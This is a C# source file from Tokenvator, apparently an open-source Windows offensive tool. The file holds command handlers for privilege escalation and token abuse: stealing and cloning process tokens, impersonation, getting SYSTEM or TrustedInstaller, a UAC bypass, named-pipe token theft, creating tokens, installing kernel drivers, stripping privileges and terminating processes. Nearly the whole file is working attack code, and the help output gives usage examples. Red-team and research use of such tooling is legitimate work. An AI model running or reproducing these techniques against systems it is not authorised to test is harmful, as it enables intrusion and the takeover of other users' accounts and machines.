using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Threading;

using Tokenvator.Resources;
using Tokenvator.Plugins.AccessTokens;
using Tokenvator.Plugins.Enumeration;
using Tokenvator.Plugins.Execution;
using Tokenvator.Plugins.MiniFilters;
using Tokenvator.Plugins.NamedPipes;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;
using System.IO;

namespace Tokenvator
{
    partial class MainLoop
    {
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _AddGroup(bool remote, int processID, IntPtr hToken, string group)
        {
            using (TokenManipulation t = new TokenManipulation(hToken))
            {
                if (remote && t.OpenProcessToken(processID))
                    t.SetWorkingTokenToRemote();
                else if (!remote)
                    t.SetWorkingTokenToSelf();
                else
                    return;
                t.SetTokenGroup(group, false);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _AddPrivilege(CommandLineParsing cLP)
        {
            TokenDriver.PRIVILEGES priv = Misc.ParseEnum<TokenDriver.PRIVILEGES>(cLP.Privilege);

            using (TokenDriver td = new TokenDriver())
            {
                if (!td.Connect())
                {
                    Console.WriteLine("[-] Driver Connect Failed");
                    return;
                }

                Console.WriteLine("[+] Connected to Driver");
                if (cLP.Remote)
                {
                    TokenDriver.PRIVILEGE_DATA data = new TokenDriver.PRIVILEGE_DATA
                    {
                        ProcessID = (uint)cLP.ProcessID,
                        Privilege = priv,
                    };
                    td.AddTokenPrivilege(data);
                }
                else
                {
                    td.AddTokenPrivilege(priv);
                }
            }
            Console.WriteLine("[*] Disconnected from Driver");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _AlterPrivilege(CommandLineParsing cLP, IntPtr hToken, Winnt.TokenPrivileges attribute)
        {
            using (TokenManipulation t = new TokenManipulation(hToken))
            {
                if (cLP.Remote && t.OpenProcessToken(cLP.ProcessID))
                    t.SetWorkingTokenToRemote();
                else if (!cLP.Remote)
                    t.SetWorkingTokenToSelf();
                else
                    return;
                t.SetTokenPrivilege(cLP.Privilege, attribute);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _BypassUAC(bool remote, int processID, string command, string input, IntPtr hToken)
        {
            Console.WriteLine("[*] Notice: This no longer working on versions of Windows 10 > 1703f");
            if (remote)
            {
                using (RestrictedToken rt = new RestrictedToken(hToken))
                {
                    rt.BypassUAC(processID, command);
                }
            }
            else
            {
                string name = WindowsIdentity.GetCurrent().Name;
                Dictionary<uint, string> uacUsers = UserSessions.EnumerateUserProcesses(true, name);
                foreach (uint pid in uacUsers.Keys)
                {
                    Console.WriteLine("\n[*] Attempting Bypass with PID {0} ({1})", pid, uacUsers[pid]);
                    using (RestrictedToken rt = new RestrictedToken(hToken))
                    {
                        rt.BypassUAC((int)pid, input);
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _ClearDesktopACL()
        {
            using (DesktopACL dA = new DesktopACL())
            {
                dA.OpenWindow();
                dA.OpenDesktop();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _CloneToken(bool remote, int processID, string command, IntPtr hToken)
        {
            if (!remote)
            {
                Console.WriteLine("[-] Unable to identify Process ID");
                return;
            }

            if (!string.IsNullOrEmpty(command))
                if (!remote)
                    Console.WriteLine("[-] Unable to parse {0}", command);

            using (TokenManipulation t = new TokenManipulation(hToken))
            {
                if (!t.OpenProcessToken(processID))
                    return;

                if (!t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityDelegation))
                {
                    Console.WriteLine("[-] Unable to Duplicate with Delegation, attempting Impersonation");
                    if (!t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                        return;
                }

                if (!t.AssignPrimaryToken())
                    return;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // https://github.com/numbnet/Win32-OpenSSH/blob/8dd7423e13ac0b88b3084ec95bc93ea09dec1fef/contrib/win32/win32compat/win32auth.c
        // https://github.com/bb107/WinSudo/blob/b2cb7700bd2f7ee59e2ef7f9ca20c2a671ce72a8/PrivilegeHelps/Security.cpp
        // https://www.exploit-db.com/papers/42556
        ////////////////////////////////////////////////////////////////////////////////
        private static void _CreateToken(CommandLineParsing cLP, IntPtr hToken)
        {   
            try
            {
                using (CreateTokens ct = new CreateTokens(hToken))
                {
                    string[] groups = new string[0];
                    if (cLP.GetData("groups", out object g))
                    {
                        groups = ((string)g).Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries);
                    }

                    if (cLP.GetData("user", out object user))
                    {
                        ct.SetWorkingTokenToSelf();
                        ct.CreateToken((string)user, groups, cLP.Command);
                    }
                    else
                    {
                        ct.SetWorkingTokenToSelf();
                        ct.CreateToken(groups, cLP.Command);
                    }
                }
            }
            catch (AccessViolationException ex)
            {
                Console.WriteLine(ex);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _FindUserProcesses(CommandLineParsing cLP)
        {
            if (!cLP.GetData("user", out object username))
            {
                Console.WriteLine("[-] Username not specified");
                return;
            }
            Dictionary<uint, string> processes = UserSessions.EnumerateUserProcesses(false, (string)username);
            Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
            Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
            foreach (uint pid in processes.Keys)
            {
                Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _FindUserProcessesWMI(CommandLineParsing cLP)
        {
            if (!cLP.GetData("user", out object username))
            {
                Console.WriteLine("[-] Username not specified");
                return;
            }
            Dictionary<uint, string> processes = UserSessions.EnumerateUserProcessesWMI((string)username);
            Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
            Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
            foreach (uint pid in processes.Keys)
            {
                Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Identifies a pipe to access
        ////////////////////////////////////////////////////////////////////////////////
        private static bool _GetPipeName(string input, out string pipeName, out string command)
        {
            string name = Misc.NextItem(ref input);
            command = string.Empty;

            if (name == input)
            {
                Console.WriteLine("[-] Pipename is missing");
                Console.WriteLine("[*] steal_pipe_token $PIPE_NAME $OPTIONAL_COMMAND");
                pipeName = string.Empty;
                return false;
            }

            if (name != input)
            {
                command = input;
            }

            try
            {
                pipeName = name.Contains(@"\\.\pipe") ? name.Replace(@"\\.\pipe", "") : name;
            }
            catch (Exception ex)
            {
                if (ex is ArgumentNullException)
                {
                    Console.WriteLine(ex.Message);
                }
                else if (ex is ArgumentException)
                {
                    Console.WriteLine(ex.Message);
                }
                pipeName = "tokenvator";
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _GetSystem(CommandLineParsing cLP, IntPtr hToken)
        {
            bool exists, enabled;
            TokenInformation.CheckTokenPrivilege(hToken, "SeDebugPrivilege", out exists, out enabled);

            if (exists)
            {
                using (TokenManipulation t = new TokenManipulation(hToken))
                {
                    t.SetWorkingTokenToSelf();

                    if (!enabled)
                        t.SetTokenPrivilege(Winnt.SE_DEBUG_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED);

                    
                    if (string.IsNullOrEmpty(cLP.Command))
                        t.GetSystem();
                    else
                        t.GetSystem(cLP.CommandAndArgs);
                }
            }
            else
            {
                if (string.IsNullOrEmpty(cLP.Command))
                    NamedPipes.GetSystem();
                else
                    NamedPipes.GetSystem(cLP.Command, cLP.Arguments);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _GetTrustedInstaller(CommandLineParsing cLP, IntPtr hToken)
        {
            bool exists, enabled;
            TokenInformation.CheckTokenPrivilege(hToken, "SeDebugPrivilege", out exists, out enabled);

            if (exists)
            {
                using (TokenManipulation t = new TokenManipulation(hToken))
                {
                    t.SetWorkingTokenToSelf();

                    if (!enabled)
                        t.SetTokenPrivilege(Winnt.SE_DEBUG_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED);

                    if (string.IsNullOrEmpty(cLP.Command))
                        t.GetTrustedInstaller();
                    else
                        t.GetTrustedInstaller(cLP.CommandAndArgs);
                }
            }
            else
            {
                Console.WriteLine("[-] SeDebugPrivilege Is Not Assigned to Token");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _Help(string input)
        {
            string item = Misc.NextItem(ref input);
            if ("help" != item)
                _HelpItem(item);
            else
                _HelpMenu();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _Info(CommandLineParsing cLP, IntPtr hToken)
        {
            using (TokenInformation t = new TokenInformation(hToken))
            {
                if (cLP.Remote)
                {
                    if (!t.OpenProcessToken(cLP.ProcessID))
                    {
                        return;
                    }
                    t.SetWorkingTokenToRemote();
                }
                else
                {
                    t.SetWorkingTokenToSelf();
                }

                hToken = t.GetWorkingToken();

                Console.WriteLine("[*] Primary Token");
                t.GetTokenUser();
                
                Console.WriteLine();

                Console.WriteLine("[*] Impersonation Tokens");

                bool all = cLP.GetData("all", out object obj);
                if (all)
                {
                    t.ListThreads(cLP.ProcessID);
                    t.GetThreadUsers();
                    Console.WriteLine();
                }

                Console.WriteLine("[*] Primary Token Groups");
                t.GetTokenGroups();
                Console.WriteLine();

                if (all)
                {
                    t.GetTokenSource();
                    Console.WriteLine();
                    
                    t.GetTokenPrivileges();
                    Console.WriteLine();
                    
                    t.GetTokenOwner();
                    Console.WriteLine();
                    
                    t.GetTokenPrimaryGroup();
                    Console.WriteLine();
                    
                    t.GetTokenDefaultDacl();
                    Console.WriteLine();

                    Winnt._TOKEN_TYPE tokenType;
                    TokenInformation.GetElevationType(hToken, out tokenType);
                    TokenInformation.PrintElevation(hToken);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // sc create TokenDriver binPath="C:\Windows\System32\kerneltokens.sys" type=kernel
        ////////////////////////////////////////////////////////////////////////////////
        private static void _InstallDriver(CommandLineParsing cLP)
        {
            //string servicename = Misc.NextItem(ref command);
            //string path = Misc.NextItem(ref command);
            //string force = Misc.NextItem(ref command);

            string serviceName = "TokenDriver";
            if (cLP.GetData("ServiceName", out object sn))
            {
                serviceName = (string)sn;
            }

            string path = string.Empty;
            if (cLP.GetData("Path", out object p))
            {
                path = (string)p;
            }

            bool overwrite = false;
            if (cLP.GetData("Force", out object f))
            {
                overwrite = true;
            }

            Console.WriteLine("[*] Service Name: " + serviceName);
            Console.WriteLine("[*] Service Path: " + path);

            PSExec psexec = new PSExec(serviceName);

            if (!psexec.Connect("."))
            {
                Console.WriteLine("[-] Unable to connect to service controller");
                return;
            }

            string filename;
            try
            {
                filename = Path.GetFullPath(path);
            }
            catch (Exception ex)
            {
                if (ex is ArgumentException)
                {
                    filename = CreateProcess.FindFilePath(path);
                    if (string.IsNullOrEmpty(filename))
                    {
                        Console.WriteLine("[-] Unable to locate service binary");
                        return;
                    }
                }
                else
                {
                    return;
                }
            }

            Console.WriteLine("[*] Full Path: " + filename);

            if (!File.Exists(filename))
            {
                Console.WriteLine("[-] Unable to find service binary: {0}");
                return;
            }

            if (!psexec.Open())
            {
                if (!psexec.CreateDriver(filename, overwrite))
                {
                    return;
                }
                if (!psexec.Open())
                {
                    return;
                }
            }

            if (!psexec.Start())
            {
                return;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _IsCriticalProcess(bool remote, int processID, IntPtr hProcess)
        {
            if (remote)
            {
                hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, (uint)processID);
                if (IntPtr.Zero == hProcess)
                {
                    Misc.GetWin32Error("OpenProcess");
                    return;
                }
            }

            bool bIsCritical = false;
            if (!kernel32.IsProcessCritical(hProcess, ref bIsCritical))
            {
                Misc.GetWin32Error("IsProcessCritical");
                kernel32.CloseHandle(hProcess);
                return;
            }
            Console.WriteLine("Process Critical: {0}", bIsCritical);
            kernel32.CloseHandle(hProcess);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _ListFilters()
        {
            using (Filters filters = new Filters())
            {
                filters.First();
                filters.Next();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _ListFiltersInstances(string input)
        {
            using (FilterInstance filterInstance = new FilterInstance(Misc.NextItem(ref input)))
            {
                filterInstance.First();
                filterInstance.Next();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _ListPrivileges(CommandLineParsing cLP, IntPtr hToken)
        {
            using (TokenInformation ti = new TokenInformation(hToken))
            {
                if (cLP.Remote && ti.OpenProcessToken(cLP.ProcessID))
                    ti.SetWorkingTokenToRemote();
                else if (!cLP.Remote)
                    ti.SetWorkingTokenToSelf();
                else
                    return;
                ti.GetTokenPrivileges();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _LogonUser(string input, IntPtr hToken)
        {
            string start = Misc.NextItem(ref input);
            string domain = string.Empty;
            string username = string.Empty;
            string password = string.Empty;
            Winbase.LOGON_TYPE logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE;
            if (username.Contains('\\'))
            {
                string[] split = start.Split('\\').ToArray();
                domain = split[0];
                split = split[1].Split(':').ToArray();
                start = split[0];
                password = string.Join("", split.Skip(1).Take(split.Length - 1).ToArray());
            }
            else
            {
                string[] split = start.Split(':').ToArray();
                switch (split.First().ToLower().Replace(" ", "").Trim())
                {
                    case "localservice":
                        username = "LocalService";
                        logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                        break;
                    case "localsystem":
                        username = "LocalSystem";
                        logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                        break;
                    case "networkservice":
                        username = "Network Service";
                        logonType = Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE;
                        break;
                    default:
                        Console.WriteLine(4);
                        username = split[0];
                        password = string.Join("", split.Skip(1).Take(split.Length - 1).ToArray());
                        break;
                }
                domain = "NT AUTHORITY";
            }

            using (TokenManipulation t = new TokenManipulation(hToken))
            {
                t.LogonUser(domain, username, password, logonType, input, start);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _NukePrivileges(bool remote, int processID, IntPtr hToken)
        {
            using (TokenManipulation t = new TokenManipulation(hToken))
            {
                if (remote && !t.OpenProcessToken(processID))
                    return;
                else
                    t.SetWorkingTokenToSelf();

                t.DisableAndRemoveAllTokenPrivileges();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _SampleProcess()
        {
            Dictionary<string, uint> users = UserSessions.EnumerateTokens(false);
            Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
            Console.WriteLine("{0,-40}{1,-20}{2}", "----", "----------", "------------");
            foreach (string name in users.Keys)
            {
                Console.WriteLine("{0,-40}{1,-20}{2}", name, users[name], Process.GetProcessById((int)users[name]).ProcessName);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _SampleProcessWMI()
        {
            Dictionary<string, uint> users = UserSessions.EnumerateTokensWMI();
            Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
            Console.WriteLine("{0,-40}{1,-20}{2}", "----", "----------", "------------");
            foreach (string name in users.Keys)
            {
                Console.WriteLine("{0,-40}{1,-20}{2}", name, users[name], Process.GetProcessById((int)users[name]).ProcessName);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _SetCriticalProcess(bool remote, int processID, string command, IntPtr hProcess)
        {
            bool bSetting;
            if (!bool.TryParse(command, out bSetting))
            {
                Console.WriteLine("[-] Invalid Boolean Specified: {0}", command);
                return;
            }
            uint uSetting = Convert.ToUInt32(bSetting);

            if (remote)
            {
                hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_SET_INFORMATION, false, (uint)processID);
                if (IntPtr.Zero == hProcess)
                {
                    Misc.GetWin32Error("OpenProcess");
                    kernel32.CloseHandle(hProcess);
                    return;
                }
            }

            uint status = ntdll.NtSetInformationProcess(hProcess, ntdll._PROCESS_INFORMATION_CLASS.ProcessBreakOnTermination, ref uSetting, (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(uint)));
            if (0 != status)
            {
                Misc.GetNtError("NtSetInformationProcess", status);
                kernel32.CloseHandle(hProcess);
                return;
            }
            Console.WriteLine("Process {0} is Marked as Critical", processID);
            kernel32.CloseHandle(hProcess);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _StartDriver(CommandLineParsing cLP)
        {
            if (!cLP.GetData("ServiceName", out object sn))
            {
                Console.WriteLine("[-] ServiceName not set");
                return;
            }


            PSExec p = new PSExec((string) sn);
            if (!p.Connect("."))
            {
                Console.WriteLine("[-] Unable to connect to service controller");
                return;
            }
            if (!p.Start())
            {
                return;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static bool _StealToken(CommandLineParsing cLP, IntPtr hToken)
        {
            if (!cLP.Remote)
            {
                Console.WriteLine("[-] Unable to identify Process ID");
                return false;
            }

            using (TokenManipulation t = new TokenManipulation(hToken))
            {
                
                if (string.IsNullOrWhiteSpace(cLP.Command))
                {
                    if (t.OpenProcessToken(cLP.ProcessID))
                    {
                        if (t.ImpersonateUser())
                        {
                            return true;
                        }
                    }
                }
                else
                {
                    if (t.OpenProcessToken(cLP.ProcessID))
                    {
                        if (t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                        {
                            if (t.StartProcessAsUser(cLP.Command))
                            {
                                return true;
                            }
                        }
                    }
                }
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _StealPipeToken(string input)
        {
            Console.WriteLine(input);
            string pipeName, command;
            if (_GetPipeName(input, out pipeName, out command))
            {
                if (string.Empty == command.ToLower())
                {
                    NamedPipes.GetPipeToken(pipeName);
                }
                else
                {
                    Console.WriteLine("[*] Running {0}", command);
                    NamedPipes.GetPipeToken(pipeName, command);
                }
            }
            else if ("getsystem" == Misc.NextItem(ref input))
            {
                NamedPipes.GetSystem();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _SubProcessStdIn()
        {
            try
            {
                var reader = new System.IO.StreamReader(Console.OpenStandardInput());
                while (!reader.EndOfStream)
                    process.StandardInput.WriteLine(reader.ReadLine());
            }
            catch (Exception ex)
            {
                if (!(ex is ThreadAbortException))
                    Console.Error.WriteLine("GiveProcStdIn:" + ex.Message);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _SubProcessStdOut()
        {
            try
            {
                System.IO.StreamReader reader = process.StandardOutput;
                while (!reader.EndOfStream)
                    Console.WriteLine(reader.ReadLine());

                reader = process.StandardError;
                while (!reader.EndOfStream)
                    Console.WriteLine(reader.ReadLine());
            }
            catch (Exception ex)
            {
                if (!(ex is ThreadAbortException))
                    Console.Error.WriteLine("ShowProcStdOut:" + ex.Message);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _Terminate(bool remote, int processID, IntPtr hProcess)
        {
            if (remote)
            {
                hProcess = kernel32.OpenProcess(Winnt.PROCESS_TERMINATE, false, (uint)processID);
                if (IntPtr.Zero == hProcess)
                {
                    Misc.GetWin32Error("OpenProcess");
                    return;
                }
                Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));

                if (!kernel32.TerminateProcess(hProcess, 0))
                {
                    Misc.GetWin32Error("TerminateProcess");
                    return;
                }
                Console.WriteLine("[+] Process Terminated");
            }
            else
            {
                Console.WriteLine("[-] Unable to identify Process ID");
            }
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _UnfreezeToken(bool remote, int processID)
        {
            using (TokenDriver td = new TokenDriver())
            {
                if (!td.Connect())
                {
                    Console.WriteLine("Driver Connect Failed");
                    return;
                }
                if (remote)
                    td.UnFreezeToken((uint)processID);
                else
                    td.UnFreezeToken();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _UnInstallDriver(string command)
        {
            string name = command.Replace(".sys", "");
            using (PSExec p = new PSExec(name))
            {
                if (!p.Connect("."))
                    return;

                if (!p.Open())
                    return;

                if (!p.Stop())
                    return;

                if (!p.Delete())
                    return;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _ReadProcessMemory(string input)
        {

        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _Run(CommandLineParsing cLP)
        {
            process = new Process();
            process.StartInfo.FileName = cLP.Command;
            process.StartInfo.Arguments = cLP.Arguments;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            Console.WriteLine("[+] Starting {0}", cLP.CommandAndArgs);
            Console.WriteLine("[*] Note: The prompt is currently missing for input");
            Console.WriteLine();
            process.Start();

            Thread inThread = new Thread(() => _SubProcessStdIn());
            Thread outThread = new Thread(() => _SubProcessStdOut());
            inThread.Start();
            outThread.Start();

            process.WaitForExit();

            inThread.Abort();
            outThread.Abort();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // This is probably going to break on certain consoles - e.g. Hangul || Kanji
        ////////////////////////////////////////////////////////////////////////////////
        private static void _RunAsNetOnly(CommandLineParsing cLP)
        {
            string[] domain_user;
            string domain;
            string username;

            if (!cLP.GetData("", out object un))
            {
                Console.WriteLine("[-] Username not specified");
            }

            string userInfo = (string)un;
            if (userInfo.Contains("\\"))
            {
                domain_user = userInfo
                    .Split(new string[] { "\\" }, StringSplitOptions.RemoveEmptyEntries);
                domain = (2 == domain_user.Length) ? domain_user[0] : ".";
                username = (2 == domain_user.Length) ? domain_user[1] : domain_user[0];
            }
            else if (userInfo.Contains("@"))
            {
                domain_user = userInfo
                    .Split(new string[] { "@" }, StringSplitOptions.RemoveEmptyEntries);
                domain = (2 == domain_user.Length) ? domain_user[1] : ".";
                username = domain_user[0];
            }
            else
            {
                domain = ".";
                username = userInfo;
            }


            if (!cLP.GetData("", out object pw))
            {
                Console.WriteLine("[-] Username not specified");
            }
            string password = (string)pw;

            Console.WriteLine("[*] Username: {0}", username);
            Console.WriteLine("[*] Domain:   {0}", domain);
            Console.WriteLine("[*] Password: {0}", password);

            if (string.IsNullOrEmpty(cLP.Command))
            {
                bool retVal = advapi32.LogonUser(
                    username, domain, password,
                    Winbase.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
                    Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
                    out IntPtr phToken
                );

                if (!retVal || IntPtr.Zero == phToken)
                {
                    Misc.GetWin32Error("LogonUser");
                    return;
                }

                Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
                advapi32.DuplicateTokenEx(
                    phToken,
                    (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, 
                    ref securityAttributes,
                    Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    Winnt._TOKEN_TYPE.TokenImpersonation, 
                    out IntPtr phNewToken
                );

                kernel32.CloseHandle(phToken);

                if (!retVal || IntPtr.Zero == phNewToken)
                {
                    Misc.GetWin32Error("DuplicateTokenEx");
                    return;
                }

                WindowsIdentity newId = new WindowsIdentity(phNewToken);
                WindowsImpersonationContext impersonatedUser = newId.Impersonate();
                Console.WriteLine("[*] If you run \"info all\", you should now see a thread token in the primary thread.");

                if (!retVal)
                {
                    Misc.GetWin32Error("ImpersonateLoggedOnUser");
                    return;
                }

                Console.WriteLine("[+] Operating As: {0}", WindowsIdentity.GetCurrent().Name);
            }
            else
            {
                Console.WriteLine("[*] Command: {0}", cLP.Command);

                Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO
                {
                    cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(Winbase._STARTUPINFO))
                };

                bool retVal = advapi32.CreateProcessWithLogonW(
                    username, domain, password,
                    Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY,
                    cLP.Command, 
                    cLP.Arguments,
                    Winbase.CREATION_FLAGS.CREATE_NEW_PROCESS_GROUP,
                    IntPtr.Zero, 
                    Environment.CurrentDirectory,
                    ref startupInfo,
                    out Winbase._PROCESS_INFORMATION processInformation
                );              

                if (!retVal)
                {
                    Misc.GetWin32Error("CreateProcessWithLogonW");
                    return;
                }

                Console.WriteLine("[+] Process ID: {0}", processInformation.dwProcessId);
                Console.WriteLine("[+] Thread ID:  {0}", processInformation.dwThreadId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _RunPowerShell(CommandLineParsing cLP)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(cLP.Command);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            foreach (PSObject obj in results)
            {
                Console.WriteLine(obj.ToString());
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _HelpMenu()
        {
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "Name", "Optional", "Required");
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "----", "--------", "--------");
            for (int i = 0; i < options.GetLength(0); i++)
            {
                Console.WriteLine("{0,-25}{1,-20}{2,-20}", options[i, 0], options[i, 1], options[i, 2]);
            }
            Console.WriteLine("e.g. (Tokens)> Help List_Filter_Instances");
            Console.WriteLine("e.g. (Tokens)> Help Privileges");
            Console.WriteLine("");
            Console.WriteLine("e.g. (Tokens)> Steal_Token 27015");
            Console.WriteLine("e.g. (Tokens)> Steal_Token 27015 cmd.exe");
            Console.WriteLine("e.g. (Tokens)> Enable_Privilege SeDebugPrivilege");
            Console.WriteLine("e.g. (Tokens)> Enable_Privilege 27015 SeDebugPrivilege");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static void _HelpItem(string input)
        {
            if ("privileges" == input.ToLower())
            {
                foreach (string item in TokenManipulation.validPrivileges)
                {
                    Console.WriteLine(item);
                }
                return;
            }

            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "Name", "Optional", "Required");
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "----", "--------", "--------");
            for (int i = 0; i < options.GetLength(0); i++)
            {
                if (input.ToLower() == options[i, 0].ToLower())
                {
                    Console.WriteLine("{0,-25}{1,-20}{2,-20}", options[i, 0], options[i, 1], options[i, 2]);
                    Console.WriteLine(" ");
                    Console.WriteLine("e.g. (Tokens)> {0}", options[i, 3]);
                    return;
                }
            }

        }
    }
}
